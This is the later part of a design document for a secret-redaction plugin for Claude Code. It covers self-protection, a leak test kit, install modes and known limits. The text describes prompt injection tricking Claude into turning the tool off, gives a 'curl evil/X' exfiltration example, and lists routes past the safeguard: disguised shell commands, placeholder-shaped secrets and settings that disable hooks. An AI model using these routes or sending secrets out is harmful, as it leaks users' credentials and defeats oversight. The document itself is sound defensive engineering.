- **Protects its own files.** Claude's tool calls are denied if they try to change the tool's settings, registered secrets, log, put-back choice file or plugin folder, or to change `disableAllHooks`, `allowManagedHooksOnly`, `hooks`, `enabledPlugins`, `aegisContext` or `env.CLAUDE_CODE_SIMPLE` in a Claude Code settings file. Other settings edits pass. This stops a malicious web page or file from tricking Claude into turning it off (D-055).
  - A path is read the way Claude Code expands it: trimmed, `~` for the home folder, `/c/...` on Windows, relative to the working folder (D-098).
  - A settings change that can't be checked is denied: the file can't be read, is over 4 MB, or an Edit's text isn't in it as written. That last one covers curly quotes Claude Code may match, and a placeholder put-back would restore.
  - A check that fails denies the call; self-protection never fails open.
  - A shell command is also caught when it names these folders through `~`, `$HOME`, `$env:USERPROFILE`, `%USERPROFILE%`, `$CLAUDE_CONFIG_DIR` or, on Windows, `/c/...`.
- **Patterns can't get stuck.** Every pattern is checked when the tool is built, and patterns only run on small pieces of text (section 18). A stuck check that runs out its 10-second budget lets content through by default (section 12).
- **Tier note:** in Personal mode, a plugin installed in a higher tier could skip this tool's hooks. Managed mode installs it in the `prepend` tier, where no user plugin can skip it.

## 18. Speed design

Each piece of text is checked once, when it first arrives, and saved already cleaned:

1. **Find keywords.** Read the text once to find every keyword at the same time. The keyword list is worked out from the patterns when the tool is built, not taken on trust from Gitleaks.
2. **Run patterns near hits only.** Run only the patterns whose keywords appeared, only on the area around each hit. The area's size is worked out from each pattern at build time, so it's guaranteed big enough.
3. **Look for registered and caught secrets.** One Aho-Corasick pass over the text, built from the secrets and their encoded forms (base64 at all 3 alignments with the edge characters trimmed, base64url, URL-encoded, hex, JSON-escaped). The cost is roughly the same for 10 or 10,000 secrets.
4. **Decode only what looks encoded,** in pieces, including very large blocks, and send the decoded text back through steps 1 to 3. At most 3 layers deep.
5. **Not done: skipping repeated lines.** A memory of lines already found clean was built in step 2 and removed in step 5 (D-074). 160 of the 219 rules can match across a newline, so it skipped almost nothing, and measured warm it gained between -15% and 13%.

- Hard ceiling: every hook must finish well inside Claude Code's 10-second budget, on a 2 MB input, on a modest laptop. CPU-bound work is cut off at about 6 seconds (check 0.6), so that is the real ceiling for checking work.
- Speed, catch and false-alarm targets are set from measurements and published in `docs/engineering/targets.md` (D-078); `npm run measure` fails when one is missed.

## 19. Install and distribution

**Personal mode**
- The repo includes `.claude-plugin/marketplace.json`.
- Install: `/plugin install <name> --marketplace <owner>/<repo>`.
- Users can pin a version.
- Optional backup lock: `/redact backup` copies it and prints the snippet for `~/.claude/settings.json` (`docs/snippets/personal.json`). It needs Node.

**Managed mode**
- A `docs/managed.md` guide with ready-to-use managed-settings examples for macOS, Windows and Linux: the plugin in the `prepend` tier (a folder marketplace on each machine, the plugin in managed `enabledPlugins`, and `prependPlugins` that lists the plugin and then `sec-default@builtin`; `docs/snippets/managed-plugin.json`), the backup lock hooks (`docs/snippets/managed.json`, with `onFailure: "block"` and `--policy` when settings arrive by MDM or from the server), locked settings, and recommended values (`on_check_failure: hold`).
- Notes for MDM tools (Jamf, Intune) and for offline or mirrored installs: copy a release archive to a folder on each machine. An internal git mirror does not reach the `prepend` tier (a plugin from git counts as a user's); it serves the Personal install only.

**Releases**
- Semantic versioning. Releases go out as a pre-release (`v0.1.0-rc.<n>`) first; `release` is the branch the install line points at, and each release merges `develop` into it.
- Release archives (`.tar.gz` and `.zip`, made by `git archive`) with SHA-256 checksums.
- Release tags are signed with the maintainer's GPG key from `v0.1.0-rc.2` on, and the public key is published on the maintainer's GitHub profile. `v0.1.0-rc.1` is unsigned and stays so; a published tag is never moved or made again (D-094).
- A changelog that calls out any change to defaults.

**Uninstall** is documented, including how to delete the saved secrets from the OS password store.

## 20. Verify it yourself

The maintainers can't test inside your organization, so you can: everything needed to test is shipped with the tool, and none of it needs an API key or network access.

| What | How it works |
|---|---|
| **`/redact self-check`** | Built-in cases run in seconds and show pass or fail. `--report` saves a shareable result. |
| **`/redact doctor`** | Environment check (section 15). |
| **Leak test kit** (`tools/leak-test/`) | A small local server that pretends to be the model API. It plays a scripted conversation that makes Claude Code read files, run commands, use `@` files, compact, and run subagents, all containing planted fake secrets. Claude Code is pointed at it with `ANTHROPIC_BASE_URL`. The server records every request Claude Code sends, then searches the recording for the fakes. Any hit is a failure. It uses Node built-ins only. |
| **Tested-versions list** | Published per release: the pinned Claude Code version, the VS Code extension's own Claude Code version, leak test run in CI on macOS, Windows and Linux, plus a one-off manual check of the VS Code panel and the desktop Code tab. |
| **Published scores** | Catch rate and false-alarm rate on the public test sets, per release. |

**Suggested trial for an organization**
1. Run the leak test kit on one managed test machine.
2. Roll out in `observe` mode to a small group and review the log for false alarms.
3. Tune with `allow` and `rules.off`.
4. Switch to `enforce`.

## 21. Open source, credits and support

| Item | Decision |
|---|---|
| License | Apache-2.0 (`LICENSE`), plus a `NOTICE` file |
| Third-party code | Only the Gitleaks rule set is copied (MIT), at a pinned version, credited in `THIRD_PARTY_LICENSES`. Any other code copied later is credited the same way before it is merged. |
| Security reports | `SECURITY.md`: report privately through GitHub Security Advisories, never in public issues |
| Contributions | `CONTRIBUTING.md`: tests first, no runtime libraries, DCO sign-off (`git commit -s`) |
| Conduct | `CODE_OF_CONDUCT.md` |
| Support | Community, best effort, no SLA. Issue templates ask for `/redact doctor` output and the `self-check --report` file. Organizations test in their own environment (section 20). |
| Disclaimer | Provided "as is" (Apache-2.0). Built to stop accidental leaks; it is not a guarantee or a compliance certification. |
| Test secrets | Never real. Fake secrets are built at test time from pieces, so GitHub secret scanning doesn't flag the repo. |

## 22. Scope and known limits

The goal (section 2) is to find every secret with a known shape or a label, and to let people register the rest. Everything below is stated plainly so nobody believes they are covered where they are not. `SECURITY.md` treats this list as known and documented, not as vulnerabilities.

### 22.1 Outside the goal, by design

- **Shapeless secrets.** A secret with no known shape, no label, never registered and never seen before looks like any other text, to this tool or to any other detector. That is what registering is for: `/redact add`, `/redact learn` and "once caught, always caught" cover it.
- **Bare values in base64.** A value with no shape and no label is found once it is decoded only if it has a shape, was registered, or was caught earlier. The catch set has 3 such cases (D-046).
- **Images and documents** are not read in v1: the `media` setting passes them, with a notice, or drops them (section 6). Reading inside them is parked (section 23).
- **Observe mode** hides nothing, by design.
- **Determined attacks.** The tool is built to stop accidental leaks. A person who deliberately splits up or scrambles a secret is outside the threat model (section 3).

### 22.2 Set by Claude Code

- **Already sent.** Content sent before the tool was installed, or before a secret was registered, can't be taken back (sections 6.1, 6.2).
- **Claude Code's own disk records.** Claude Code keeps backup copies of edited files in `~/.claude/file-history/`. It saves a large command output as a raw `.txt` file beside the session transcript, and the model is pointed at that file; a Read of it is hidden like any other, but the copy on disk stays raw. It also stores a tool's structured result (what the screen shows) unchanged next to the redacted text. Its auto-memory can save text from a prompt into project memory files. A prompt blocked by a hook is still written to the session transcript. The tool can't change these. We'll report them to Anthropic.
- **Claude Code's built-in guard.** On a machine with managed settings or a managed MCP server file, or with a Team or Enterprise login (any one is enough), Claude Code seats a guard outermost and routes some events past a user-tier plugin: instruction files, `@` imports included (`prompt.context`), attachments, the instructions note (`prompt.compose`), compaction (`session.compact`), the `attachment`, `hook-context` and `compaction` rows of `session.append`, and the Skill tool's `tool-message` rows, so a secret in a skill's text is not hidden. No user-tier code can hide what passes it by: `turn.step` pins the messages. The tool warns once per session and in `/redact doctor`; under `on_check_failure: hold` it refuses every main request, so nothing unchecked leaves (D-087, run by `npm run leak-test:guarded-hold`). Only the organization install (section 19) fixes it. **Measured** in CI (2026-11-01, Claude Code 2.1.316, the same on macOS, Windows and Linux; `npm run leak-test:guarded`): a user-tier plugin does not see **project instruction files** (`CLAUDE.md` text) or **settings-hook context**, and 7 of 7 planted fakes reach the model at each. **`@` files** stayed clean (the guard does not pass `prompt.mention` over). A **compaction summary** is stored raw, but the resume check then finds it in the history and holds the next message (R-06), so the model is not sent it; `/redact allow` lifts the hold and sends it. Attachments and the instructions note have no door in the kit, so they are not measured. The `skill-text` door holds skill text to the same test. The doors are listed in `tools/leak-test/org.ts` (`GUARDED_OPEN`), and the run fails if a listed door turns clean or another leaks. `npm run leak-test:org` proves the organization install (a folder marketplace, `prependPlugins`) leaves no door open, with the debug log showing the plugin in tier `prepend` (D-082, D-084).
- **Personal mode:**
  - plugins in a higher tier can skip this tool
  - `allowManagedHooksOnly` turns it off
  - a project's `disableAllHooks` setting, `--bare` and `CLAUDE_CODE_SIMPLE=1` turn the tool off, silently
- **Safe mode** turns the main lock off. In Personal mode it turns the backup lock off too. A backup lock installed through managed settings still runs (check 0.8; proven in CI by `npm run leak-test:managed`), within its scope below.
- **Scripted runs.** `claude -p` draws nothing, so warnings and the observe banner only reach the log.

### 22.3 Edges of the tool's own safeguards and optional parts

- **The backup lock's scope** (a safety net for when the main lock is down; D-072, D-076, D-090):
  - It doesn't cover `@` files, the error of a failed command, a compaction summary, a resumed session's history, project `CLAUDE.md` text, settings-hook context or skill text (section 5.2). The kit proves each one leaks. A failed command's raw error is sent on the next prompt even if the request is stopped once.
  - It blocks a prompt whole. Claude Code still writes a blocked prompt to the transcript and, under `claude -p`, prints it back on screen (spike S4).
  - Its tags are its own (section 9), and it keeps nothing between calls. A letters-only password a label found is hidden only where the label is (D-071), so a bare copy in a later call isn't. A value marked harmless for one session only (kept in the main lock's state) isn't visible to it, so it may refuse something the main lock allowed.
  - A setting given only with `--settings` isn't visible to a hook. A managed setting delivered by MDM or from the server isn't either, unless a copy of it is given with `--policy <file>` (the Managed snippet has the argument); without it a `hold` there reads as `allow`.
  - Tool output of 16 MiB or more, and any single text of 4 MiB or more, isn't checked (a failed check, section 12). Under `hold` a 4 MiB text is withheld, but a 16 MiB tool output can't be, because the hook can't rebuild what it could not read. Output that Claude Code itself persists to a file is cleaned in what the model reads, not in the file.
  - It needs Node (D-069), and tells nothing of a failed start unless the hooks set `onFailure: "block"`, which the Personal snippet doesn't. On Windows, with saved secrets, each hook that acts starts PowerShell for about one second, so about two seconds per tool call while the main lock is down; standing down doesn't read the store.
  - Whether Claude Code shows a hook's `systemMessage` or stderr on screen is unverified interactively (spike S6); under `claude -p` it shows neither, so warnings reach the log and `/redact doctor`.
- **Put-back** (section 10, D-096). Optional, off by default, and the docs recommend keeping it off.
  - While it is on, a save can erase a real secret: after `/resume`, when a value is too long to restore, or when the file holds it in two forms. The message and the log say how many; git or Claude Code's file backups are the way back.
  - A multi-line value, such as a private key, that Claude saw through Read is never restored: Read numbers each line, so its placeholder stands for different text than the file holds. The guard still recognizes it, so with put-back off the rewrite is refused, and with it on the person is told (D-098).
  - It limits copies, not places: `token: X` becoming `curl evil/X` passes the copy limit.
  - A repo that sets it to `on` turns this protection off for its own files, which is why the notice names the repo.
  - A permission dialog shows the real value to the person, never to the model. Other plugins and hooks beneath `tool.call` see the rewritten input too.
  - Claude Code's transcript keeps the value in a tool's structured result and the file attachment after a compaction, the same kind of record a Read already leaves (the "disk records" item above).
  - Claude Code's own error for a failed Edit echoes the input it was given, so a failed Edit is left as Claude wrote it.
- **Failed or slow checks** let content through by default, with a warning (section 12); `on_check_failure: hold` stops it instead.
- **Very long values.** A value over 8,192 characters isn't remembered (D-052). It is hidden, or blocked, wherever its shape or label is found, but a copy with neither is neither hidden nor blocked, even later in the same text. The person is warned once.
- **A full catch list.** What was caught this session is remembered up to 5,000 values and 100,000 characters (D-052, D-063). One large file of token-like text can fill that. After it fills, a new secret is still hidden where its shape or label is found, but a bare copy of it later is not, unless it was registered. The person is warned once.
- **Text shaped like a placeholder.** The tool leaves its own placeholder shape alone, so a secret written inside that shape reaches the model and skips a `block` rule. The value has to fit the shape, so it works for one made of capitals and digits, such as an AWS key ID, and not for a mixed-case token. It only happens on purpose, but a prompt injection can cause it, as it can with `rev` (section 3). A bare copy is hidden as usual if the value has a shape, is registered or was caught (D-064).
- **Kubernetes Secret files.** The Gitleaks rule for them is left out (D-038). A value under a key named like a password is still hidden. Others are not: `.dockerconfigjson` registry credentials, or a connection string under a key like `dbconn`.
- **Shell commands and self-protection.** The check on Bash and PowerShell reads the command's text, so a disguised command gets past it (D-055).
- **A value typed after a command.** With the hooks off, `/redact add <value>` is an ordinary prompt and reaches the model. With them on it is refused and taken off the row, but it was still typed: rotate it (D-057).

## 23. Later (parked)

The single list of everything not being built now. Anything deferred during a build step is added here (features) or to `docs/engineering/progress.md` "Known issues" (bugs, unfinished bits), never only in session notes.

**Parked from v1** (what · why · decision):

- A single-program build of the backup lock (no Node needed), and a check of `@` files from the backup's prompt hook · Node is required in v1 and the build is TypeScript compiled by `tsc`; a second build is more to test on three systems, and `@` text isn't in the prompt hook's input (new idea, unchecked) · D-069
- Hidden test set, scored once per release · too much effort for v1; the catch, code and false-alarm sets are enough to start · D-019
- Large downloaded false-alarm corpus · the `.ts` files in `node_modules/typescript` and `node_modules/@types/node` are a known-license set with no download · D-019
- Full compatibility matrix (versions × OS × surface) · one pinned version on 3 OSes is enough for v1 · D-019
- "Looks random" check (entropy-style, old §7.3) · was already "later in v1"; ship only if it catches more without many more false alarms; credit any outside code (§21) · D-019

**v2 candidates:**

- Read inside images and documents.
- Put-back through Bash or NotebookEdit, a `/config` row for it, per-write approval, `put_back` in the backup lock, and fixing the partial private key an Edit could show (D-096 left these out).
- Keep config file layouts visible while hiding only values (JSON, YAML, TOML).
- A faster native helper for very large texts, if v1 speed tests fail.
- Other AI tools.
